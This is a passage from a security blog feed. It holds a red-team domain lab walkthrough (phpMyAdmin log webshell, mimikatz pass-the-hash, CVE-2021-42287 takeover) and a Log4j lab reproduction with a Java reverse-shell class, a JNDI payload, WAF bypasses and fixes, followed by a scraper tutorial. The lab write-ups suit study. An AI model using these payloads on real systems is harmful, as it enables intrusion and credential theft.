    <published>2021-12-23T06:04:17.000Z</published>
    <updated>2021-12-23T15:39:34.485Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ATT-amp-CK红队评估实战靶场一"><a href="#ATT-amp-CK红队评估实战靶场一" class="headerlink" title="ATT&amp;CK红队评估实战靶场一"></a>ATT&amp;CK红队评估实战靶场一</h1><p>靶场下载：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p><strong>网络拓扑图：</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221183009.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali： 192.168.210.128</span><br><span class="line"></span><br><span class="line">web机：192.168.210.129</span><br><span class="line"></span><br><span class="line">windows 2003： 192.168.17.130</span><br><span class="line"></span><br><span class="line">windows 2008（域控）： 192.168.17.129</span><br></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>VM2为域内网段(windows 2003,windows 2008 R2)</p><p>VM8为外网网段(kali，web机)</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221183127.png"></p><p>web机能ping通域内，能ping通kali即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221183521.png"></p><p>web机开启phpstudy</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221183410.png"></p><p>访问页面成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221184320.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫一波端口</p><p><code>nmap -sS -Pn 192.168.210.129</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221185023.png"></p><p>开放了80和3306端口</p><p>看到php探针，反手往目录里敲一个/phpmyadmin</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221185405.png"></p><h2 id="phpmyadmin-getshell"><a href="#phpmyadmin-getshell" class="headerlink" title="phpmyadmin getshell"></a>phpmyadmin getshell</h2><p>弱口令登陆成功 root/root</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221185504.png"></p><p>查看有没有配置<strong>secure_file_priv</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221190720.png"></p><p><strong>secure_file_priv=null</strong>，也就是不可写，这一方法不可行</p><p>选择全局日志getshell</p><p>查看日志：<code>show variables like &#39;%general%&#39;;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221190958.png"></p><p>我们将它开启，并写入shell.php</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="keyword">on</span>; #开启全局日志</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>; #更改日志路径</span><br></pre></td></tr></table></figure><p>写入一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &lt;?php eval($_POST[shell]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221191515.png"></p><p>成功往日志写入一句话</p><p>蚁剑连接成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221191953.png"></p><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>为administrator权限</p><p>ipconfig /all发现有两张网卡，存在域</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221192532.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221192800.png"></p><p>权限较高，直接上线cs</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221193805.png"></p><p>抓到密码，直接是域控的</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221193926.png"></p><p>端口扫描(192.168.210)：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221194110.png"></p><p>没有什么可以利用的</p><p>端口扫描(192.168.17):</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211221233041.png"></p><p>发现内网还有另外两台机器</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211222232806.png"></p><p>不出意外129那台机器应该就是域控</p><p>首先根据WEB机创建一个listener，然后使用web机做跳板机</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211223084830.png"></p><p>成功上线域内一台主机</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211223084859.png"></p><h2 id="cs与msf联动"><a href="#cs与msf联动" class="headerlink" title="cs与msf联动"></a>cs与msf联动</h2><p>将cs会话转发到msf上</p><p>msf设置监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set lhost </span><br><span class="line">set lport </span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211222225941.png"></p><p>cs中右键spawn</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211222230127.png"></p><p>收到会话</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211222230237.png"></p><p>net view 查看域内成员</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211222235126.png"></p><p>关闭防火墙</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofile state</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211223003108.png"></p><p>如果出现中文乱码使用 <code>chcp 65001</code> 更改</p><p>尝试使用<strong>ms17010</strong>打一波域控</p><p>首先使用scan模块探测一波</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br><span class="line">set rhost 192.168.17.0&#x2F;24</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211222230913.png"></p><p>在扫到129时，msf爆绿，可能存在ms17-010，而129就是域控</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211222231901.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">set rhost 192.168.17.129</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211222233149.png"></p><p>利用失败，无法直接拿下</p><h2 id="上线域控"><a href="#上线域控" class="headerlink" title="上线域控"></a>上线域控</h2><p>访问共享文件夹</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211223105749.png"></p><p>创建白银票据，使用<strong>hash传递</strong>的方式，创建票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::pth &#x2F;domain:god.org &#x2F;user:administrator &#x2F;ntlm:81be2f80d568100549beac645d6a7141（WEB机的）</span><br></pre></td></tr></table></figure><p>再次访问域控C盘</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211223110054.png"></p><p>成功共享域控文件夹</p><p>制作一个<strong>smb</strong>的正向马，并传到域控机器上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy c:\yukong.exe \\owa\c$</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211223110901.png"></p><p>使用at计划任务并连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">at \\owa 11:11 C:&#x2F;yukong.exe #计划任务</span><br><span class="line">link 192.168.17.129 #主动连接域控</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211223111431.png"></p><p>成功上线域控</p><p>使用cs psexec横向也是一个道理</p><h2 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a>CVE-2021-42287</h2><p>使用最新提权漏洞<strong>CVE-2021-42287</strong></p><p>首先开一个socks，cs中开启即可，proxychains中进行设置</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211222231020.png"></p><p>使用命令一键上线域控：<code>proxychains4 python3 sam_the_admin.py &#39;god/liukaifeng01:123456Zb.&#39; -dc-ip 192.168.17.129 -shell</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211223090210.png"></p><p>直接拿下域控，通杀</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211223111537.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ATT-amp-CK红队评估实战靶场一&quot;&gt;&lt;a href=&quot;#ATT-amp-CK红队评估实战靶场一&quot; class=&quot;headerlink&quot; title=&quot;ATT&amp;amp;CK红队评估实战靶场一&quot;&gt;&lt;/a&gt;ATT&amp;amp;CK红队评估实战靶场一&lt;/h1&gt;&lt;p&gt;靶场</summary>
      
    
    
    
    <category term="-渗透" scheme="https://blog.abinix.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Apache Log4j漏洞复现</title>
    <link href="https://blog.abinix.top/2021/12/13/Apache%20Log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://blog.abinix.top/2021/12/13/Apache%20Log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-12-13T13:17:48.000Z</published>
    <updated>2021-12-23T15:39:23.641Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">Apache Log4j漏洞复现</h1><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><blockquote><p>Apache Log4j 是 Apache 的一个开源项目，Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。该日志框架被大量用于业务系统开发，用来记录日志信息。</p></blockquote><p><strong>Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。</strong></p><p>如下组件均有该漏洞</p><p>Spring-Boot-strater-log4j2<br>Apache Struts2<br>Apache Solr<br>Apache Flink<br>Apache Druid<br>ElasticSearch<br>Flume<br>Dubbo<br>Redis<br>Logstash<br>Kafka<br>vmvare</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>代码的主要内容就是一旦发现日志中包含 <code>$&#123;</code> 就会将<strong>表达式的内容替换为表达式解析后的内容</strong>，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211213205035.png"></p><p>之后进入 <strong>Interpolator</strong> 类的 <strong>lookup</strong> 方法，（可以把一些系统变量放到日志中）由前缀值 <strong>jndi</strong> 获取到 <strong>JndiLookup</strong> 类，最终调用对应的 <strong>lookup</strong> 方法发起请求</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211213205902.jpeg"></p><p>总结：日志在打印时当遇到 <code>$&#123;</code> 后，<strong>Interpolator</strong> 类以 <code>:</code> 号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。</p><p>所以poc：<code>$&#123;jndi:ldap://xxx.xxx.xxx.xxx/exp&#125;</code></p><h2 id="验证过程："><a href="#验证过程：" class="headerlink" title="验证过程："></a>验证过程：</h2><p>poc为<code>$&#123;jndi:ldap://8v1wxm.dnslog.cn&#125;</code>格式的字符串，在log4j2打印包含这个字符串的日志时，通过<strong>JNDI</strong>对ldap://<a href="https://link.zhihu.com/?target=http://blabla.com">8v1wxm.dnslog.cn</a>进行请求。所以，如果能注入成功，则在请求网址的时候，会对<a href="https://link.zhihu.com/?target=http://blabla.com">8v1wxm.dnslog.cn</a>这个域名进行解析，并留下解析记录。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211213210524.png"></p><p>所以当注入成功时，dnslog就会留下解析记录</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>打开靶机（使用靶机为ctfshow靶机）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211213150133.png"></p><h2 id="1、构造反序列化exp，改一下ip即可"><a href="#1、构造反序列化exp，改一下ip即可" class="headerlink" title="1、构造反序列化exp，改一下ip即可"></a>1、构造反序列化exp，改一下ip即可</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/12000 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2、用javac编译一下"><a href="#2、用javac编译一下" class="headerlink" title="2、用javac编译一下"></a>2、用javac编译一下</h2><p><strong>注意：javac编译版本必须为1.8，否则复现不成功</strong></p><blockquote><p>log4jrce 是通过lookup触发的漏洞，但jdk1.8.191以上默认不支持ldap协议，对于高版本jdk,则需要一定的依赖。</p></blockquote><p>把这个类编译之后会得到一个Exploit.class</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211213150110.png"></p><h2 id="3、开启web服务"><a href="#3、开启web服务" class="headerlink" title="3、开启web服务"></a>3、开启web服务</h2><p>将刚刚得到的class放入我们即将开启的web目录里面，使用python2自带的<strong>SimpleHTTPServer</strong></p><p><code>python2 -m SimpleHTTPServer 444</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211213150240.png"></p><p>如上图，开启web服务后，访问页面也会有相应回显</p><h2 id="4-开启marshalsec-IDAP服务"><a href="#4-开启marshalsec-IDAP服务" class="headerlink" title="4.开启marshalsec IDAP服务"></a>4.开启marshalsec IDAP服务</h2><p>项目地址：<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><p>利用marshalsec开启一个恶意的IDAP服务命令为：<code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://118.31.59.38:444/#Exp&quot; 9997</code></p><p>端口为9997，开启监听</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211213150422.png"></p><h2 id="5-打EXP"><a href="#5-打EXP" class="headerlink" title="5.打EXP"></a>5.打EXP</h2><p>poc：<code>$&#123;jndi:ldap://118.31.59.38:9997/Exp&#125;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211213150701.png"></p><h2 id="6-反弹shell"><a href="#6-反弹shell" class="headerlink" title="6.反弹shell"></a>6.反弹shell</h2><p>本地开启监听<code> nc -lvnp 12000</code> </p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211213150548.png"></p><p>成功回弹shell</p><h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><blockquote><p>如果企业已经部署了 WAF 等安全产品，在漏洞爆发之初就应该及时更新规则，临时处置，从而给后续的根治争取时间，从 payload 上看，有几个关键特征:<code>$&#123;</code>,<code>jndi</code>,<code>ldap</code>,<code>rmi</code>等，但是如果只是拦截 <code>jndi</code> 等字符串，很可能没有很好的效果，因为可以进行字符串拼接从而绕过检测，而如果拦截 <code>$&#123;</code>，又可能造成正常功能无法使用，毕竟可能存在正常请求中包含这个关键词的情况。</p></blockquote><p>1、jndi、ldap、rmi 绕过</p><ul><li>用 lowerCase upperCase 把关键词分割开</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211213211347.webp"></p><p>2.<code>$&#123;</code> 关键词拦截</p><p>这个范围大，而且会误报，感觉不太会设置${拦截</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>1.升级Apache Log4j 2至最新安全版本2.15.0-rc2：<strong><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></strong></p><p>2.升级已知受影响的应用及组件，如<strong>spring-boot-starter-log4j2/ApacheStruts2/ApacheSolr/ApacheDruid/Apache Flink。</strong></p><p><strong>临时解决方案：</strong></p><p>1.设置jvm参数”-Dlog4j2.formatMsgNoLookups=true”；</p><p>2.设置系统环境变量</p><p>“FORMAT_MESSAGES_PATTERN_DIS-ABLE_LOOKU_PS”为”true”；</p><p>3.关闭应用的网络外连。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;Apache Log4j漏洞复现&lt;/h1&gt;

&lt;h1 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Apach</summary>
      
    
    
    
    <category term="-漏洞复现" scheme="https://blog.abinix.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Log4j" scheme="https://blog.abinix.top/tags/Log4j/"/>
    
  </entry>
  
  <entry>
    <title>爬虫项目</title>
    <link href="https://blog.abinix.top/2021/11/23/%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE/"/>
    <id>https://blog.abinix.top/2021/11/23/%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE/</id>
    <published>2021-11-23T07:58:21.000Z</published>
    <updated>2021-11-23T08:03:01.399Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">爬虫笔记</h1><p><strong>爬取burst.shopify.com内容</strong></p><p>[TOC]</p><h1 id="总体思想"><a href="#总体思想" class="headerlink" title="总体思想"></a>总体思想</h1><ol><li>​    观察网页构造，为写代码做准备，检查是否有反爬技术</li><li>​    检查所要下载的图片，观察格式，并且构造正则表达式</li><li>​    过滤重复的图片</li><li>​    保存图片，并作相关优化</li></ol><h1 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h1><ol><li>可批量下载照片</li><li>可选择类别下载</li><li>编写面向对象程序爬取</li></ol><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802102824.png"></p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>打开burst.shopify.com网页，观察其结构</p><p>观察到当我们打开一个类别的图片使，url中就将目录切换至类别下，这一点有助于我们后续的<strong>代码优化</strong>，可根据类别下载等</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802103600.png"></p><p>我们可以用F12观察网页源代码，根据图片的路径来进行爬虫的抓取</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802104058.png"></p><p>如上图，这一段就是这张图片在网页中的位置，我们打开图片的位置，在浏览器中显示图片</p><p><strong>可以发现这里有一堆的jpg文件，并且都是一张照片，这里我就要想到后期要进行去重，不能有重复的照片显示出来</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802104154.png"></p><p>如上图，但是我们可以发现，这张图片并不是高清图片，观察url后可以发现，.jpg后面传参了一堆数据</p><p><code>https://burst.shopifycdn.com/photos/love-letters-and-hearts.jpg?width=746&amp;format=pjpg&amp;exif=0&amp;iptc=0</code></p><p>我们将？后面的去掉后可以发现</p><p>![image-20210802104433046](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210802104433046.png)</p><p>变成了高清带图（这里试错了很多次）</p><p>这一部分有助于我们后面的<strong>正则过滤</strong></p><p>更换第二页时，url回显如上，有助于我们后期代码优化</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802104641.png"></p><h1 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h1><ul><li><h2 id="引用库"><a href="#引用库" class="headerlink" title="引用库"></a>引用库</h2><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802105103.png"></p><p>运用re库来进行正则匹配</p><p>运用requests库来获取HTTP的请求</p></li></ul><ul><li><h2 id="设置头，反爬"><a href="#设置头，反爬" class="headerlink" title="设置头，反爬"></a>设置头，反爬</h2><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802105623.png"></p><blockquote><p>user-agent属性值为python-requests，在很多网站爬取的过程中，会被拦截</p><p>当被拦截时，请求失效</p></blockquote><p>所以我们要伪装成一个正常的用户，这时设置头便是最简单的方法伪装成用户了</p><p>头的查看很简单，打开f12，下图中的红框框就是</p><p>我们在代码中提前申明，后面再调用即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802105855.png"></p></li></ul><ul><li><h2 id="正则部分"><a href="#正则部分" class="headerlink" title="正则部分"></a>正则部分</h2><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802105927.png"></p><p>这一部分代码用来请求url，并且运用re库，进行正则的过滤来获取我们想要的信息</p><p>正则的用法如下图：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/6080384636f52.jpg"></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/6080393d36a4d.jpg"></p><p>​    最常用的便是 <strong>.*?</strong> 可以过滤一些常用的，我这里也用到了</p><p>​    <code>re.findall(&quot;https://burst.*?jpg&quot;, html)</code>这段代码意思是使用re模块匹配源码    中为jpg的文件，并且只匹配到jpg，这也说明我们只匹配了高清大图，符合我们的需求</p><ul><li><h2 id="代码去重"><a href="#代码去重" class="headerlink" title="代码去重"></a>代码去重</h2><p>上面说到会有重复的图片所以我们要根据程序来去重</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802110351.png"></p><p>使用i来遍历请求，只要i不在这个列表中，（如果重复了，则被过滤掉了）则抓取图片</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802110608.png"></p><p>这一部分的代码用来过滤新一页中会有重复的部分，思路一致</p></li></ul><ul><li><h2 id="保存图片"><a href="#保存图片" class="headerlink" title="保存图片"></a>保存图片</h2><p>抓取的图片我们要将图片保存，这里用到open函数进行保存</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802110651.png"></p><p>并且设置计数功能，记录当前下载的图片数</p></li></ul><ul><li><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><ol><li>根据图片位置为图片编号，以便后续操作</li><li>设置多页面下载</li><li>查看是否完全去重</li></ol></li><li><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">A.bin</span></span><br><span class="line"><span class="string">21.7.22</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line">j=<span class="number">1</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#x27;animals&#x27; &#x27;city&#x27; &#x27;home&#x27; &#x27;seasons&#x27; &#x27;education&#x27; &#x27;landscape&#x27; &#x27;family&#x27; \n &quot;</span></span><br><span class="line">      <span class="string">&quot;&#x27;love&#x27; &#x27;around the world&#x27; &#x27;arts&#x27; &#x27;technology&#x27; &#x27;outdoor&#x27; &#x27;backgrounds&#x27; \n &quot;</span></span><br><span class="line">      <span class="string">&quot;&#x27;fashion&#x27; &#x27;beauty&#x27; &#x27;people&#x27; &#x27;transportation&#x27; &#x27;business&#x27; \n &quot;</span></span><br><span class="line">      <span class="string">&quot;&#x27;fitness&#x27; &#x27;travel&#x27; &#x27;flowers&#x27; &#x27;work&#x27; &#x27;food&#x27; &#x27;holidays&#x27; &#x27;celebrate&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#&#123;设置头，反爬&#125;</span></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">key = <span class="built_in">input</span>(<span class="string">&#x27;请从上面挑选出要下载的图片类型：&#x27;</span>)</span><br><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入一共要下载的页数：&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;请求url与编写正则表达式&#125;</span></span><br><span class="line"><span class="keyword">if</span> num &gt;= <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> j &lt;= num:</span><br><span class="line">        url = <span class="string">&#x27;https://burst.shopify.com/&#x27;</span> + key + <span class="string">&#x27;?page=&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        resp=requests.get(url,headers=headers)</span><br><span class="line">        html=resp.text</span><br><span class="line">        urls=re.findall(<span class="string">&quot;https://burst.*?jpg&quot;</span>, html)</span><br><span class="line">        lst=[]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;当第二页刷新时有和第一页相同的图片,所以以下为去重代码&#125;</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">1</span> :</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> urls:   <span class="comment">#遍历jpg</span></span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> lst:</span><br><span class="line">                    lst.append(i)</span><br><span 